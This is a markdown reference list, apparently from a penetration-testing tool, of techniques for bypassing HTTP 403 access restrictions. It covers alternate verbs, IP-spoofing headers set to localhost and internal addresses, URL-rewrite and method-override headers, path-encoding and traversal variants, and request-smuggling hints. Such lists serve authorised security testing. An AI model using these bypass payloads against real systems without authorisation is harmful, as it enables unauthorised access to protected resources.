# 40X Bypass Techniques List

This file documents all the bypass techniques currently implemented in `bypass_403.py`.

## 1. HTTP Verbs
Attempts to access the resource using different HTTP methods, which might not be restricted by the ACL.
- `GET` (Baseline)
- `POST`
- `PUT`
- `DELETE`
- `PATCH`
- `HEAD`
- `PROPFIND` (WebDAV)
- `OPTIONS`
- `TRACE`
- `CONNECT`
- `INVENTED` (Invalid method to test default handling)

## 2. HTTP Headers

### IP Spoofing
Attempts to trick the server into believing the request originates from a trusted IP (localhost or internal network).
**Headers:**
- `X-Originating-IP`
- `X-Forwarded-For`
- `X-Forwarded`
- `Forwarded-For`
- `X-Remote-IP`
- `X-Remote-Addr`
- `X-ProxyUser-Ip`
- `Client-IP`
- `True-Client-IP`
- `Cluster-Client-IP`
- `X-Client-IP`
- `X-Real-IP`

**Values:**
- `127.0.0.1`
- `localhost`
- `0.0.0.0`
- `192.168.1.1`
- `10.0.0.1`

### URL Rewriting / Overrides
Exploits frameworks that trust headers to determine the target path, potentially bypassing front-end WAFs that inspect the actual URI.
- `X-Original-URL: /target/path`
- `X-Rewrite-URL: /target/path`
- `X-Override-URL: /target/path`
- `X-Forwarded-URL: /target/path`

### Method Overrides
Tunnels a restricted method (like POST or PUT) through an allowed method (usually GET or POST).
- `X-HTTP-Method-Override: POST`
- `X-HTTP-Method: POST`
- `X-Method-Override: POST`

## 3. Path Manipulation
Modifies the requested path to bypass string-based rules while still resolving to the target resource.

### Traversal & Normalization
- `/path/./` (Dot segment)
- `//path//` (Double slash)
- `/./path/./`
- `/path/..;/` (Traversal with semicolon)
- `///path//`

### Characters & Encoding
- `/path%20` (Space)
- `/path%09` (Tab)
- `/path?`
- `/path??`
- `/path/` (Trailing slash)
- `/%2e/path` (Dot encoded)
- `/quote(path)` (Full URL encoding)

### Case Sensitivity
- `/PATH` (Upper case)
- `/pAtH` (Swapped case)

### Framework Specifics (Tomcat, Spring, etc.)
- `/path;`
- `/path;/`
- `/path;index.html`
- `/path;param=value`
- `/path;.css`
- `/path;.js`
- `/;/path`
- `/.;/path`

### Extension Appending
Attempts to confuse the server about the file type.
- `/path.json`
- `/path.html`
- `/path.xml`
- `/path.php`
- `/path.aspx`
- `/path.jsp`
- `/path/file.ext`

### Platform Specific
- `\path` (Windows backslash)
- `/.\path`

## 4. Protocol Pollution / Smuggling Hints
- `POST` request with `_method: POST` in body (Framework tunneling).
- `Transfer-Encoding: chunked` header (Tests for smuggling parsing discrepancies).
